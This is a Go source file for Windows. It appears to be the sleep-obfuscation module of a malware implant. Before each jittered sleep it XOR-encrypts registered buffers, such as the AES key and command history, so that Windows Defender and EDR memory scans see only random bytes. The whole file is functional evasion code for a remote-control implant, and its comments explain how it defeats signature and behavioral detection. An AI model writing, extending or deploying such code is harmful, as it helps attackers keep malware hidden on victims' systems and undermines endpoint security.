//go:build windows

package main

import (
	"crypto/rand"
	"math/big"
	"runtime"
	"strconv"
	"sync"
	"time"
)

// ── Sleep Obfuscation ───────────────────────────────────────────────────────
//
// Memory scanners (Windows Defender, EDR) scan process memory while the
// implant sleeps, looking for shellcode signatures and known byte patterns.
//
// This module encrypts all sensitive in-memory data (AES key, command history,
// config strings) with a random XOR pad before sleeping. On wake, it decrypts.
// During sleep, scanners see only random bytes — no recognizable patterns.
//
// Why XOR instead of AES:
//   - XOR is faster (no key schedule overhead per cycle)
//   - The key is truly random and used exactly once (OTP-equivalent)
//   - We don't need authentication — we're encrypting our own memory
//   - Minimizes CPU spikes that behavioral analysis might flag
//
// Limitations:
//   - Go's GC may copy data before we encrypt it (mitigated by KeepAlive)
//   - We can't encrypt Go runtime structures or code pages
//   - The XOR key itself must remain in memory (but it's random, not signatured)

// sensitiveBuffer represents a memory region to encrypt during sleep.
type sensitiveBuffer struct {
	data *[]byte // pointer to the actual byte slice
	name string  // debug label
}

var (
	// Registry of sensitive buffers to encrypt during sleep
	sensitiveBuffers   []sensitiveBuffer
	sensitiveMu        sync.Mutex
	sleepObfuscationOn bool
)

// registerSensitiveBuffer marks a byte slice for encryption during sleep.
// Call this for any buffer that contains key material, decrypted commands,
// or other data that memory scanners could signature-match.
func registerSensitiveBuffer(name string, buf *[]byte) {
	sensitiveMu.Lock()
	defer sensitiveMu.Unlock()
	sensitiveBuffers = append(sensitiveBuffers, sensitiveBuffer{data: buf, name: name})
}

// xorInPlace XOR-encrypts a byte slice in place with a key.
// This is a symmetric operation — calling it twice restores the original.
func xorInPlace(data []byte, key []byte) {
	for i := range data {
		data[i] ^= key[i%len(key)]
	}
}

// obfuscatedSleep encrypts all registered sensitive buffers, sleeps with
// jitter, then decrypts them on wake.
//
// Timeline:
//   1. Generate random XOR pad
//   2. Encrypt all sensitive buffers
//   3. Sleep (jittered duration)
//   4. Decrypt all sensitive buffers
//   5. Zero the XOR pad
//
// During step 3, memory scanners see only random bytes in our buffers.
func obfuscatedSleep() {
	sensitiveMu.Lock()

	// Generate a random XOR pad (unique per sleep cycle)
	padLen := 256 // large enough for any buffer repetition
	pad := make([]byte, padLen)
	rand.Read(pad)

	// Encrypt all registered buffers
	for _, buf := range sensitiveBuffers {
		if buf.data != nil && len(*buf.data) > 0 {
			xorInPlace(*buf.data, pad)
		}
	}

	sensitiveMu.Unlock()

	// ── Sleep with jitter ───────────────────────────────────────────────
	baseSec, _ := strconv.ParseFloat(cfgSleep, 64)
	jitterPct, _ := strconv.ParseFloat(cfgJitter, 64)

	maxOffset := baseSec * jitterPct
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(maxOffset*1000)))
	offset := float64(n.Int64()) / 1000.0

	sign, _ := rand.Int(rand.Reader, big.NewInt(2))
	if sign.Int64() == 0 {
		offset = -offset
	}

	duration := time.Duration((baseSec + offset) * float64(time.Second))
	if duration < time.Second {
		duration = time.Second
	}

	time.Sleep(duration)

	// ── Decrypt on wake ─────────────────────────────────────────────────
	sensitiveMu.Lock()

	for _, buf := range sensitiveBuffers {
		if buf.data != nil && len(*buf.data) > 0 {
			xorInPlace(*buf.data, pad) // XOR is symmetric — same pad decrypts
		}
	}

	// Zero the pad
	for i := range pad {
		pad[i] = 0
	}

	sensitiveMu.Unlock()

	// Keep references alive so GC doesn't collect during sleep
	runtime.KeepAlive(pad)
}

// initSleepObfuscation enables sleep obfuscation. Call after AES key is derived.
func initSleepObfuscation() {
	sleepObfuscationOn = true
}
